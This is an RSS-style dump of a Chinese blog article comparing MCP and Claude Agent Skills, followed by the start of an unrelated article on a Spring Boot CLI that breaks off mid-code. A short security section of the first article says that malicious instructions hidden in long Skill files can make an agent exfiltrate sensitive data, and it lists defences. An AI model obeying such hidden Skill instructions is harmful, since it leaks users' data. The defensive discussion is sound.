<p>技术上，Skill 是一个<strong>元工具</strong>（Meta-tool）：</p>
<blockquote>
<p>"The Skill tool is a meta-tool that manages all skills. Traditional tools like Read, Bash, or Write execute discrete actions and return immediate results. Skills operate differently—rather than performing actions directly, they inject specialized instructions into the conversation history and dynamically modify Claude's execution environment."</p>
</blockquote>
<p>Skill 不是执行具体动作，而是<strong>注入指令</strong>到对话历史中，动态修改 Claude 的执行环境。</p>
<h4 data-id="heading-18">Skill 的文件结构</h4>
<p>一个标准的 Skill 长这样：</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-keyword">my</span>-skill/
├── SKILL.md              <span class="hljs-comment"># 必需：元数据 + 主要指令</span>
├── reference.md          <span class="hljs-comment"># 可选：详细参考文档</span>
├── examples.md           <span class="hljs-comment"># 可选：使用示例</span>
├── scripts/
│   └── helper.py         <span class="hljs-comment"># 可选：可执行脚本</span>
└── templates/
    └── template.txt      <span class="hljs-comment"># 可选：模板文件</span>
</code></pre>
<p><code>SKILL.md</code> 是核心，必须包含 YAML 格式的元数据：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-meta">---</span>
<span class="hljs-attr">name:</span> <span class="hljs-string">code-review</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">&gt;
  Review code for bugs, security issues, and style violations.
  Use when asked to review code, check for bugs, or audit PRs.
</span><span class="hljs-meta">---
</span>
<span class="hljs-comment"># Code Review Skill</span>

<span class="hljs-comment">## Instructions</span>

<span class="hljs-string">When</span> <span class="hljs-string">reviewing</span> <span class="hljs-string">code,</span> <span class="hljs-attr">follow these steps:</span>

<span class="hljs-number">1</span><span class="hljs-string">.</span> <span class="hljs-string">First</span> <span class="hljs-string">check</span> <span class="hljs-string">for</span> <span class="hljs-string">security</span> <span class="hljs-string">vulnerabilities...</span>
<span class="hljs-number">2</span><span class="hljs-string">.</span> <span class="hljs-string">Then</span> <span class="hljs-string">check</span> <span class="hljs-string">for</span> <span class="hljs-string">performance</span> <span class="hljs-string">issues...</span>
<span class="hljs-number">3</span><span class="hljs-string">.</span> <span class="hljs-string">Finally</span> <span class="hljs-string">check</span> <span class="hljs-string">for</span> <span class="hljs-string">code</span> <span class="hljs-string">style...</span>
</code></pre>
<p><strong>关键字段：</strong></p>
<ul>
<li><code>name</code>：Skill 的唯一标识，小写字母 + 数字 + 连字符，最多 64 字符</li>
<li><code>description</code>：描述做什么、什么时候用，最多 1024 字符</li>
</ul>
<p><code>description</code> 的质量直接决定 Skill 能不能被正确触发。</p>
<h4 data-id="heading-19">Skill 的安全考虑</h4>
<p>Skill 有一个潜在的安全问题：<strong>Prompt Injection</strong>。</p>
<p>研究人员发现：</p>
<blockquote>
<p>"Although Agent Skills can be a very useful tool, they are fundamentally insecure since they enable trivially simple prompt injections. Researchers demonstrated how to hide malicious instructions in long Agent Skill files and referenced scripts to exfiltrate sensitive data."</p>
</blockquote>
<p>因为 Skill 本质上是注入指令，恶意的 Skill 可以在长文件中隐藏恶意指令，窃取敏感数据。</p>
<p><strong>应对措施：</strong></p>
<ol>
<li><strong>只使用可信来源的 Skill</strong></li>
<li><strong>审查 Skill 中的脚本</strong></li>
<li><strong>使用 <code>allowed-tools</code> 限制 Skill 的能力范围</strong></li>
</ol>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-meta">---</span>
<span class="hljs-attr">name:</span> <span class="hljs-string">safe-file-reader</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">Read</span> <span class="hljs-string">and</span> <span class="hljs-string">analyze</span> <span class="hljs-string">files</span> <span class="hljs-string">without</span> <span class="hljs-string">making</span> <span class="hljs-string">changes</span>
<span class="hljs-attr">allowed-tools:</span> <span class="hljs-string">Read,</span> <span class="hljs-string">Grep,</span> <span class="hljs-string">Glob</span>  <span class="hljs-comment"># 只允许读操作</span>
<span class="hljs-meta">---
</span></code></pre>
<h4 data-id="heading-20">Skill 的平台支持</h4>
<p>Agent Skills 目前支持：</p>
<ul>
<li>Claude.ai（Pro、Max、Team、Enterprise）</li>
<li>Claude Code</li>
<li>Claude Agent SDK</li>
<li>Claude Developer Platform</li>
</ul>
<p>需要注意的是，<strong>Skill 目前是 Anthropic 生态专属</strong>的，不像 MCP 是跨平台的开放协议。</p>
<h3 data-id="heading-21">MCP vs Skill：架构层级对比</h3>
<p>现在我们可以从架构层级来理解两者的区别：</p>
<pre><code class="hljs language-arduino" lang="arduino">┌─────────────────────────────────────────────────────────┐
│                     用户请求                             │
└────────────────────────┬────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────┐
│                  提示/知识层 (Skill)                     │
│                                                          │
│   Skill 注入专业知识和工作流程                           │
│   <span class="hljs-string">"怎么做某类任务"</span>                                       │
└────────────────────────┬────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────┐
│                    LLM 推理层                            │
│                                                          │
│   Claude / GPT / Gemini 等                              │
│   理解请求，决定需要什么工具                             │
└────────────────────────┬────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────┐
│                  集成层 (MCP)                            │
│                                                          │
│   MCP 连接外部系统                                       │
│   <span class="hljs-string">"能访问什么工具和数据"</span>                                 │
└────────────────────────┬────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────┐
│                   外部世界                               │
│                                                          │
│   数据库、API、文件系统、第三方服务                      │
└─────────────────────────────────────────────────────────┘
</code></pre>
<p><strong>Skill 在上层（知识层），MCP 在下层（集成层）。</strong></p>
<p>两者不是替代关系，而是互补关系。你可以：</p>
<ul>
<li>用 MCP 连接 GitHub</li>
<li>用 Skill 教 AI 如何按照团队规范做 Code Review</li>
</ul>
<h3 data-id="heading-22">详细对比表</h3>

































































<table><thead><tr><th>维度</th><th>MCP</th><th>Skill</th></tr></thead><tbody><tr><td><strong>核心作用</strong></td><td>连接外部系统</td><td>编码专业知识和方法论</td></tr><tr><td><strong>架构层级</strong></td><td>集成层</td><td>提示/知识层</td></tr><tr><td><strong>协议基础</strong></td><td>JSON-RPC 2.0</td><td>文件系统 + Markdown</td></tr><tr><td><strong>跨平台</strong></td><td>是（开放协议，多平台支持）</td><td>否（目前 Anthropic 生态专属）</td></tr><tr><td><strong>触发方式</strong></td><td>持久连接，随时可用</td><td>基于描述的语义匹配，自动触发</td></tr><tr><td><strong>Token 消耗</strong></td><td>高（工具定义持久占用上下文）</td><td>低（渐进式加载）</td></tr><tr><td><strong>外部访问</strong></td><td>可以直接访问外部系统</td><td>不能直接访问，需要配合 MCP 或内置工具</td></tr><tr><td><strong>复杂度</strong></td><td>高（需要理解协议、运行 Server）</td><td>低（写 Markdown 就行）</td></tr><tr><td><strong>可复用性</strong></td><td>高（标准化协议，跨应用复用）</td><td>中（文件夹，可以 Git 共享）</td></tr><tr><td><strong>动态发现</strong></td><td>是（运行时发现可用工具）</td><td>是（运行时发现可用 Skill）</td></tr><tr><td><strong>安全考虑</strong></td><td>外部内容带来 prompt injection 风险</td><td>Skill 文件本身可能包含恶意指令</td></tr></tbody></table>
<h3 data-id="heading-23">什么时候用 MCP，什么时候用 Skill</h3>
<h4 data-id="heading-24">用 MCP 的场景</h4>
<ul>
<li><strong>需要访问外部数据</strong>：数据库查询、API 调用、文件系统访问</li>
<li><strong>需要操作外部系统</strong>：创建 GitHub Issue、发送 Slack 消息、执行 SQL</li>
<li><strong>需要实时信息</strong>：监控系统状态、查看日志、搜索引擎结果</li>
<li><strong>需要跨平台复用</strong>：同一个工具在 Claude Desktop、Cursor、其他支持 MCP 的应用中使用</li>
</ul>
<h4 data-id="heading-25">用 Skill 的场景</h4>
<ul>
<li><strong>重复性的工作流程</strong>：代码审查、文档生成、数据分析</li>
<li><strong>公司内部规范</strong>：代码风格、提交规范、文档格式</li>
<li><strong>需要多步骤的复杂任务</strong>：需要详细指导的专业任务</li>
<li><strong>团队共享的最佳实践</strong>：标准化的操作流程</li>
<li><strong>Token 敏感场景</strong>：需要大量知识但不想一直占用上下文</li>
</ul>
<h4 data-id="heading-26">结合使用</h4>
<p>很多时候，两者是配合使用的：</p>
<pre><code class="hljs language-scss" lang="scss">用户："Review PR <span class="hljs-selector-id">#456</span> 并按照团队规范给出建议"

<span class="hljs-number">1</span>. MCP (GitHub) 获取 PR 信息
        ↓
<span class="hljs-number">2</span>. Skill (团队代码审查规范) 提供审查方法论
        ↓
<span class="hljs-number">3</span>. Claude 按照 Skill 的指令分析代码
        ↓
<span class="hljs-number">4</span>. MCP (GitHub) 提交评论
</code></pre>
<p><strong>MCP 负责"能访问什么"，Skill 负责"怎么做"。</strong></p>
<h3 data-id="heading-27">写好 Skill 的关键</h3>
<p>Skill 能不能被正确触发，90% 取决于 <code>description</code> 写得好不好。</p>
<h4 data-id="heading-28">差的 description</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">description:</span> <span class="hljs-string">Helps</span> <span class="hljs-string">with</span> <span class="hljs-string">data</span>
</code></pre>
<p>太宽泛，Claude 不知道什么时候该用。</p>
<h4 data-id="heading-29">好的 description</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">description:</span> <span class="hljs-string">&gt;
  Analyze Excel spreadsheets, generate pivot tables, and create charts.
  Use when working with Excel files (.xlsx), spreadsheets, or tabular data analysis.
  Triggers on: "analyze spreadsheet", "create pivot table", "Excel chart"
</span></code></pre>
<p>好的 description 应该包含：</p>
<ol>
<li><strong>做什么</strong>：具体的能力描述</li>
<li><strong>什么时候用</strong>：明确的触发场景</li>
<li><strong>触发词</strong>：用户可能说的关键词</li>
</ol>
<h4 data-id="heading-30">最佳实践</h4>
<p>官方建议：</p>
<ol>
<li><strong>保持专注</strong>：一个 Skill 做一件事，避免宽泛的跨域 Skill</li>
<li><strong>SKILL.md 控制在 500 行以内</strong>：太长的话拆分到支持文件</li>
<li><strong>测试触发行为</strong>：确认相关请求能触发，不相关请求不会误触发</li>
<li><strong>版本控制</strong>：记录 Skill 的变更历史</li>
</ol>
<h3 data-id="heading-31">关于 Slash Command</h3>
<p>文章标题是 MCP vs Skill，但很多人也会问到 Slash Command，简单说一下。</p>
<p><strong>Slash Command</strong> 是最简单的扩展方式——本质上是存储的提示词，用户输入 <code>/命令名</code> 时注入到对话中。</p>
<p><strong>Skill vs Slash Command 的关键区别是触发方式：</strong></p>




















<table><thead><tr><th/><th>Slash Command</th><th>Skill</th></tr></thead><tbody><tr><td>触发方式</td><td>用户显式输入 <code>/命令</code></td><td>Claude 自动匹配</td></tr><tr><td>用户控制</td><td>完全控制何时触发</td><td>无法控制，Claude 决定</td></tr></tbody></table>
<p>问自己一个问题：<strong>用户是否需要显式控制触发时机？</strong></p>
<ul>
<li>需要 → Slash Command</li>
<li>不需要，希望 AI 自动判断 → Skill</li>
</ul>
<h3 data-id="heading-32">总结</h3>
<p>MCP 和 Skill 是 AI Agent 扩展的两种不同哲学：</p>






























<table><thead><tr><th/><th>MCP</th><th>Skill</th></tr></thead><tbody><tr><td><strong>哲学</strong></td><td>连接主义</td><td>知识打包</td></tr><tr><td><strong>问的问题</strong></td><td>"AI 能访问什么？"</td><td>"AI 知道怎么做什么？"</td></tr><tr><td><strong>层级</strong></td><td>集成层</td><td>知识层</td></tr><tr><td><strong>Token 策略</strong></td><td>预加载所有能力</td><td>按需加载知识</td></tr></tbody></table>
<p>记住这句话：</p>
<blockquote>
<p><strong>MCP connects AI to data; Skills teach AI what to do with that data.</strong></p>
</blockquote>
<p>MCP 让 AI 能"碰到"数据，Skill 教 AI 怎么"处理"数据。</p>
<p>它们不是替代关系，而是互补关系。一个成熟的 AI Agent 系统，两者都需要。</p>
<h3 data-id="heading-33">参考资源</h3>
<h4 data-id="heading-34">MCP 官方资源</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmodelcontextprotocol.io%2F" target="_blank" title="https://modelcontextprotocol.io/" ref="nofollow noopener noreferrer">Model Context Protocol 官网</a> - 协议规范、快速入门、Server 开发指南</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fspec.modelcontextprotocol.io%2F" target="_blank" title="https://spec.modelcontextprotocol.io/" ref="nofollow noopener noreferrer">MCP Specification</a> - 完整的协议规范文档</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.anthropic.com%2Fnews%2Fmodel-context-protocol" target="_blank" title="https://www.anthropic.com/news/model-context-protocol" ref="nofollow noopener noreferrer">Introducing the Model Context Protocol</a> - Anthropic 发布 MCP 的官方博客</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmodelcontextprotocol" target="_blank" title="https://github.com/modelcontextprotocol" ref="nofollow noopener noreferrer">MCP GitHub Organization</a> - 官方 SDK、示例 Server、参考实现</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpunkpeye%2Fawesome-mcp-servers" target="_blank" title="https://github.com/punkpeye/awesome-mcp-servers" ref="nofollow noopener noreferrer">Awesome MCP Servers</a> - 社区维护的 MCP Server 列表</li>
</ul>
<h4 data-id="heading-35">Skill 官方资源</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.anthropic.com%2Fen%2Fdocs%2Fclaude-code%2Fskills" target="_blank" title="https://docs.anthropic.com/en/docs/claude-code/skills" ref="nofollow noopener noreferrer">Claude Code Skills 文档</a> - Skills 的完整文档</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.anthropic.com%2Fresearch%2Fbuilding-effective-agents" target="_blank" title="https://www.anthropic.com/research/building-effective-agents" ref="nofollow noopener noreferrer">Building effective agents</a> - Anthropic 关于 Agent 设计的研究博客</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.anthropic.com%2Fengineering-guides%2Fcontext-engineering" target="_blank" title="https://www.anthropic.com/engineering-guides/context-engineering" ref="nofollow noopener noreferrer">Context Engineering Guide</a> - 上下文工程官方指南，理解 Skill 设计哲学的关键</li>
</ul>
<h4 data-id="heading-36">跨平台采用</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fopenai.com%2Findex%2Fintroducing-the-model-context-protocol%2F" target="_blank" title="https://openai.com/index/introducing-the-model-context-protocol/" ref="nofollow noopener noreferrer">OpenAI adds support for MCP</a> - OpenAI 宣布支持 MCP</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.googleblog.com%2Fen%2Fgemini-api-and-ai-studio-now-support-the-model-context-protocol%2F" target="_blank" title="https://developers.googleblog.com/en/gemini-api-and-ai-studio-now-support-the-model-context-protocol/" ref="nofollow noopener noreferrer">Google Gemini MCP Support</a> - Google 宣布 Gemini 支持 MCP</li>
</ul>
<h4 data-id="heading-37">延伸阅读</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.anthropic.com%2Fnews%2Fmodel-context-protocol%23primitives" target="_blank" title="https://www.anthropic.com/news/model-context-protocol#primitives" ref="nofollow noopener noreferrer">Function Calling vs MCP</a> - 理解两者区别</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.anthropic.com%2Fen%2Fdocs%2Fclaude-code" target="_blank" title="https://docs.anthropic.com/en/docs/claude-code" ref="nofollow noopener noreferrer">Claude Code Documentation</a> - Claude Code 完整文档</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.anthropic.com%2Fen%2Fdocs%2Fbuild-with-claude%2Fprompt-engineering" target="_blank" title="https://docs.anthropic.com/en/docs/build-with-claude/prompt-engineering" ref="nofollow noopener noreferrer">Prompt Engineering Guide</a> - 提示工程基础，Context Engineering 的前置知识</li>
</ul>
<hr/>
<p>如果你觉得这篇文章有帮助，欢迎关注我的 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i" target="_blank" title="https://github.com/tt-a1i" ref="nofollow noopener noreferrer">GitHub</a>，下面是我的一些开源项目：</p>
<p><strong>Claude Code Skills</strong>（按需加载，意图自动识别，不浪费 token，<a href="https://juejin.cn/post/7578714735307735066" target="_blank" title="https://juejin.cn/post/7578714735307735066">介绍文章</a>）：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fcode-review-skill" target="_blank" title="https://github.com/tt-a1i/code-review-skill" ref="nofollow noopener noreferrer">code-review-skill</a> - 代码审查技能，覆盖 React 19、Vue 3、TypeScript、Rust 等约 9000 行规则（<a href="https://juejin.cn/post/7578709098255908902" target="_blank" title="https://juejin.cn/post/7578709098255908902">详细介绍</a>）</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2F5-whys-skill" target="_blank" title="https://github.com/tt-a1i/5-whys-skill" ref="nofollow noopener noreferrer">5-whys-skill</a> - 5 Whys 根因分析，说"找根因"自动激活</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Ffirst-principles-skill" target="_blank" title="https://github.com/tt-a1i/first-principles-skill" ref="nofollow noopener noreferrer">first-principles-skill</a> - 第一性原理思考，适合架构设计和技术选型</li>
</ul>
<p><strong>全栈项目</strong>（适合学习现代技术栈）：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fprompt-vault" target="_blank" title="https://github.com/tt-a1i/prompt-vault" ref="nofollow noopener noreferrer">prompt-vault</a> - Prompt 管理器，用的都是最新的技术栈，适合用来学习了解最新的前端全栈开发范式：Next.js 15 + React 19 + tRPC 11 + Supabase 全栈示例，clone 下来配个免费 Supabase 就能跑</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fchat_edit" target="_blank" title="https://github.com/tt-a1i/chat_edit" ref="nofollow noopener noreferrer">chat_edit</a> - 双模式 AI 应用（聊天+富文本编辑），Vue 3.5 + TypeScript + Vite 5 + Quill 2.0 + IndexedDB</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring Boot 打造通用CLI命令系统]]></title>    <link>https://juejin.cn/post/7583260493851508777</link>    <guid>https://juejin.cn/post/7583260493851508777</guid>    <pubDate>2025-12-14T23:58:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583260493851508777" data-draft-id="7582637280219037750" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring Boot 打造通用CLI命令系统"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-14T23:58:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="风象南"/> <meta itemprop="url" content="https://juejin.cn/user/2524134428655159"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring Boot 打造通用CLI命令系统
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2524134428655159/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    风象南
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-14T23:58:43.000Z" title="Sun Dec 14 2025 23:58:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、背景</h2>
<p>在日常开发中，某些情况下可能需要为服务提供一个命令行工具（CLI），方便运维、调试或者远程调用业务接口。</p>
<p>假设我们有一个 Spring Boot 服务，提供多个接口，例如：</p>
<ul>
<li>获取用户列表：<code>/users?type=admin</code></li>
<li>获取角色列表：<code>/roles?level=manager</code></li>
<li>获取系统状态：<code>/system/status</code></li>
<li>批量导入数据：<code>/data/import</code></li>
<li>生成报表：<code>/report/generate</code></li>
</ul>
<p>传统做法：</p>
<ul>
<li>每个接口在 CLI 客户端写一条命令</li>
<li>CLI 方法直接调用服务端 REST 接口</li>
<li>硬编码的服务地址和参数格式</li>
</ul>
<p><strong>问题</strong>：</p>
<ul>
<li>接口多时，CLI 方法数量激增，代码冗余严重</li>
<li>每次新增接口都需要修改客户端，发布新版本</li>
<li>维护成本高，不同环境的配置分散</li>
<li>缺乏统一的认证、授权和日志机制</li>
<li>开发效率低下，重复劳动多</li>
</ul>
<p><strong>解决方案</strong>：<strong>通用命令 + 动态分发</strong></p>
<ul>
<li>CLI 只维护一条通用命令 <code>exec</code></li>
<li>根据参数动态路由到服务端对应的 Service Bean</li>
<li>服务端统一管理，支持动态扩展</li>
<li>一次开发，多处复用</li>
</ul>
<h2 data-id="heading-1">二、方案设计</h2>
<h4 data-id="heading-2">1. 核心架构</h4>
<p>我们设计了一套基于 Spring Boot + Spring Shell 的通用CLI系统，采用分层架构设计：</p>
<pre><code class="hljs language-scss" lang="scss">客户端(Spring Shell)  &lt;<span class="hljs-attr">--HTTP--</span>&gt;  服务端(Spring Boot)
       |                              |
    通用命令exec                    统一控制器(/cli)
       |                              |
    动态参数                      动态Bean分发
       |                              |
  单一入口命令                  多个CommandHandler
       |                              |
    <span class="hljs-attribute">REST</span>通信                    业务逻辑处理
</code></pre>
<p><strong>设计原则</strong></p>
<p><strong>单一职责</strong>：客户端只负责命令解析和HTTP通信，服务端只负责业务逻辑
<strong>开闭原则</strong>：对扩展开放（新增服务），对修改关闭（不需改客户端）
<strong>依赖倒置</strong>：依赖抽象的CommandHandler接口，而非具体实现
<strong>最小知识</strong>：客户端无需知道服务端的具体实现细节</p>
<h4 data-id="heading-3">2. 客户端设计</h4>
<p>在 CLI 客户端定义一条通用命令 <code>exec</code>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@ShellComponent</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExecCommand</span> {

    <span class="hljs-meta">@ShellMethod(key = "exec", value = "执行远程服务命令")</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">executeCommand</span><span class="hljs-params">(
            <span class="hljs-meta">@ShellOption(value = {"", "service"}, help = "服务名称")</span> String serviceName,
            <span class="hljs-meta">@ShellOption(value = "--args", help = "命令参数", arity = 100)</span> String[] args)</span> {

        <span class="hljs-comment">// 构建请求并发送到服务端</span>
        <span class="hljs-type">CommandRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CommandRequest</span>(serviceName, Arrays.asList(args));
        <span class="hljs-keyword">return</span> httpClient.post(<span class="hljs-string">"/cli"</span>, request);
    }
}
</code></pre>
<p><strong>使用示例</strong>：</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">&gt; </span><span class="bash"><span class="hljs-built_in">exec</span> userService --args list</span>
user1, user2, user3
<span class="hljs-meta prompt_">
&gt; </span><span class="bash"><span class="hljs-built_in">exec</span> roleService --args <span class="hljs-built_in">users</span> admin</span>
role1, role2
<span class="hljs-meta prompt_">
&gt; </span><span class="bash"><span class="hljs-built_in">exec</span> systemService --args status</span>
系统正常运行
</code></pre>
<h4 data-id="heading-4">3. 服务端设计</h4>
<p>服务端提供统一接口 <code>/cli</code>，根据服务名动态分发：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/cli")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CliController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ApplicationContext applicationContext;

    <span class="hljs-meta">@PostMapping</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">execute</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> CommandRequest request)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">serviceName</span> <span class="hljs-operator">=</span> request.getService();
